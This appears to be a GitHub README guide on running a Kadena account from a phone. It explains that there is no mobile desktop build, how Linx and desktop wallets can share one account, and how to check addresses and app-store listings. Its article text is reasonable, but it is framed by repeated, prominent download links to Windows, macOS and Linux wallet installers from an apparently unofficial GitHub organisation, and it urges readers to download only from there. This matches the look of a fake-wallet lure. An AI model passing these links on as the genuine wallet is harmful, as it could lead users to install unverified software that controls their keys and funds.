![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Running a Kadena Account From a Phone: What Actually Works</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

The phone is where most people first meet a wallet, and for this chain it is also where the answers get vague. There is no phone build of the desktop wallet. There is a phone wallet, maintained separately, and the two can hold the same account if the keys are rebuilt the same way. Everything useful about mobile Kadena sits in that sentence.

So the question is not whether a phone works. It is what a phone is doing when it works, and what it cannot do at all.

## You'll see this if

- You searched an app store for Kadena Wallet and found nothing convincing.
- You want to hold KDA on a phone without carrying a laptop.
- You are unsure whether two devices can share one balance safely.
- You are deciding whether a phone is the right place for a balance you care about.

## The state of it

The desktop product ships three installers at its current tag, one per desktop platform, and nothing else. No phone package is among them, which settles the question for that product directly.

The phone wallet in this ecosystem is Linx. It is a separate application with a separate publisher, written to take over accounts created elsewhere, and it is where mobile users end up. Whether that is ideal is a different question from whether it is true, and it is true.

## Why a desktop-only product is a design choice, not an oversight

A phone wallet is a different security proposition from a desktop one, and the differences are not cosmetic.

**The device is shared with everything else.** A phone runs messaging apps, browsers, games and whatever was installed last week. A signing key on that device lives beside software that changes without your involvement.

**The store is in the trust path.** Mobile distribution runs through a marketplace with its own review, its own update cadence and its own account recovery. A publisher who wants users to verify a binary against a release digest finds that harder when the store mediates delivery.

**Updates arrive on someone else's schedule.** On desktop you choose when to run an installer. On a phone the platform decides when the app changes.

None of those make mobile wallets wrong. They make them a trade: convenience in exchange for a larger surface, and a publisher who ships desktop only is declining that trade rather than neglecting a platform.

## Two devices, one account

The useful property is that a balance is not stored in a wallet at all. It lives in an account on a chain. A wallet is a way of deriving the key that controls that account, so any two applications that derive the same key control the same balance.

That works when three things line up:

1. **The same secret.** Usually twelve or twenty-four words, sometimes with a passphrase. The passphrase is the one people forget, and forgetting it produces a different account rather than an error.
2. **The same derivation.** Word counts being equal does not mean the two applications walk the same path to the same account index.
3. **The same view of the chains.** An account can hold value on many chains, and an application that shows one of them will look emptier than reality.

If all three match, the phone and the desktop are two windows onto one balance. If the second one does not match, you get two accounts with two histories and no way to merge them.

## Proving it before you trust it

The test takes a few minutes and settles the question permanently.

1. Note the receiving address the phone shows for the account.
2. Compare it with the address the desktop shows for the same account.
3. Send a small amount to that address and watch both devices report it.
4. Check a chain the balance is not on, and confirm both applications agree about what is there.

If the addresses match, the derivation matches. If they do not, stop and compare derivation notes before moving anything of size. A mismatch discovered after a deposit is a support problem; discovered before, it is a five-minute correction.

## What a phone cannot do here

- **Install the desktop product.** Three installers exist, none of them mobile.
- **Run a node.** Synchronising a chain on a handset is not what phones are for, and the community's node work assumes servers.
- **Pair with the hardware app.** The Kadena hardware application is distributed outside the platform that phone wallets use for device support, so the usual mobile pairing route is not available.
- **Escape the store.** A phone application is installed through a marketplace, with the review and update path that implies.

## The listing problem

App store search rewards names, not publishers. A search for this chain will surface applications that have chosen a familiar name, and some of them are not what they claim.

Four checks, in order: the publisher named on the listing, the number of prior releases, whether the listing's description matches what the application actually does, and whether anyone in the community channels recognises it. An application that passes all four is not guaranteed safe. One that fails any of them is a reason to stop.

## A phone-first checklist

- **Small balances, small risk.** A phone is a good place for spending money and a poor place for savings.
- **Write the words down on paper** when the account is created, before any funds arrive.
- **Test the restore** on a second application while the balance is trivial.
- **Record the derivation** alongside the phrase, so a future restore is a procedure rather than an experiment.
- **Keep the passphrase somewhere the phone is not.** A secret stored beside the device it protects is one incident away from being lost twice.

## FAQ

**Is there an official Kadena Wallet app for phones?**
No phone package appears in the desktop product's release. The mobile option in this ecosystem is a separate wallet.

**Can I use the same account on a phone and a computer?**
Yes, if both derive the same key from the same secret. Compare addresses before trusting it.

**Can I recover from a phone loss with my desktop?**
Yes, if the phrase and the passphrase are intact and you can reproduce the derivation. The phone itself holds nothing you need.

**Is a phone less safe?**
It is more exposed. A device that runs many applications and updates on a schedule you do not control is a larger surface than a laptop used for one thing.

**Does the phone wallet show all twenty chains?**
Check rather than assume. Chain visibility differs between applications, and an account's holdings can span several.

## Related reading

- Best Kadena wallet in 2026: an honest shortlist
- Linx wallet versus Kadena Wallet: a fair comparison
- Seed phrase word counts and the passphrase between them
- Backing up Kadena Wallet: a restore you have tested

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Backing Up Kadena Wallet: A Restore You Have Tested](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-backup-and-restore-guide.md)
- [12 Words, 24 Words, and the Passphrase in Between](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-seed-phrase-word-counts.md)
- [Lost Seed Phrase: What Kadena Wallet Can and Cannot Recover](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/recover-lost-seed-phrase-in-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
